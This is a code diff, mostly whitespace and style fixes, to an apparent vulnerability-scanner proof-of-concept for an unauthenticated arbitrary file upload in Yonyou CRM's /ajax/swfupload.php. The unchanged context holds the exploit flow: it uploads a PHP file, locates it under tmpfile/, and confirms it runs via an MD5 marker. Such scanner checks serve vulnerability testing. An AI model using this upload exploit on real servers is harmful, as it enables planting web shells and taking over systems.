@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import random
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0025' # 平台漏洞编号，留空
+    vuln_id = 'Yonyou_0025'  # 平台漏洞编号，留空
     name = '用友CRM系统 任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-08-27'  # 漏洞公布时间
     desc = '''
         用友CRM系统 /ajax/swfupload.php?DontCheckLogin=1&vname=file 任意文件上传漏洞。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '3eecc23f-7c75-4124-84fb-e6cdcfb09558'
@@ -32,12 +34,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0137238
+
+            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0137238
             hh = hackhttp.hackhttp()
             shellName = ""
             for i in range(16):
-                shellName += chr(ord('a') + random.randint(0,25))
+                shellName += chr(ord('a') + random.randint(0, 25))
             payload = "/ajax/swfupload.php?DontCheckLogin=1&vname=file"
             raw = """
 POST /ajax/swfupload.php?DontCheckLogin=1&vname=file HTTP/1.1
@@ -68,17 +70,19 @@ upload
             code, head, res, err, _ = hh.http(self.target + payload, raw=raw)
             reRes = re.findall("(\w+.tmp.php)", res)
             if reRes:
-                code, head, res, err, _ = hh.http(self.target + "tmpfile/" + reRes[0])
+                code, head, res, err, _ = hh.http(
+                    self.target + "tmpfile/" + reRes[0])
                 if 'c4ca4238a0b923820dcc509a6f75849b' in res:
                     #security_hole(arg+payload+" ---> "+arg+"tmpfile/"+reRes[0]+" : file upload / get shell")
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
